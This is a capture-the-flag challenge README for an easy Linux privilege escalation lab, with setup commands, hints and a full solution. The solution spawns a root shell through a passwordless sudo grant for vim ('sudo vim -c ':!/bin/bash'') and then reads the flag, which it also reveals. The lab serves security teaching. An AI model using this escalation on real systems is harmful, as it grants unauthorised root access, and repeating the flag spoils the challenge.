# Challenge 2  Sudo Misconfiguration

**Difficulty:** Easy  
**Category:** Linux Privilege Escalation  
**Flag:** hidden in `/root/flag.txt`

---

## Story

You've made it inside Candie Manor. Stephen, the head house slave, manages
everything — including the system. He set up `sudo` access for one program,
thinking it was harmless. Something to help Candie review documents, perhaps.

Calvin's private ledger sits in `/root/flag.txt`. Stephen is gone for the evening.
Check what he left running and figure out how an editor becomes a root shell.

---

## Setup

```bash
docker build -t ctf-linux-easy-2 .
docker run -it --rm ctf-linux-easy-2
```

Credentials: `player` / `player123`

---

## Hints

<details>
<summary>Hint 1</summary>
Check what sudo permissions your user has:

```bash
sudo -l
```
</details>

<details>
<summary>Hint 2</summary>
Many text editors can spawn a shell from within them.
If the editor is running as root, so does that shell.
</details>

<details>
<summary>Hint 3</summary>
Look up the binary you found on GTFOBins (https://gtfobins.github.io) under the "sudo" section.
</details>

---

## Solution

<details>
<summary>Click to reveal  try on your own first!</summary>

### Step 1  Check sudo rights

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/vim
```

### Step 2  Use vim to spawn a root shell

```bash
sudo vim -c ':!/bin/bash'
```

`-c` runs a vim command immediately. `:!` executes a shell command from inside vim.
Because vim is running as root, `/bin/bash` opens as root.

### Step 3  Read the flag

```bash
cat /root/flag.txt
```

```
CTF{sud0_v1m_g4v3_m3_r00t}
```

### Why this works

`sudo` entries should follow the principle of least privilege. Allowing a user to run an editor as root is dangerous because editors can execute shell commands. Any tool that can run arbitrary code (editors, interpreters, `less`, `man`, etc.) becomes a root shell escalation path when granted via sudo.

</details>
